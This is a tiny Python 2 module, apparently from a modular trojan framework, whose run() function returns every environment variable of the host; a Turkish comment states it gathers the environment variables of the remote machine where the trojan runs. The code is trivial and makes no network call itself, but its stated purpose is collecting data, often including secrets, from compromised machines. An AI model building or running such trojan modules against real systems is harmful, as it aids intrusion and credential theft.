import os

def run(**args):
    print "[*] In environment module."
    return str(os.environ)

#bu modul truva atinin yurutuldugu uzak makinede ayarlanan tum ortam degiskenlerini alir.
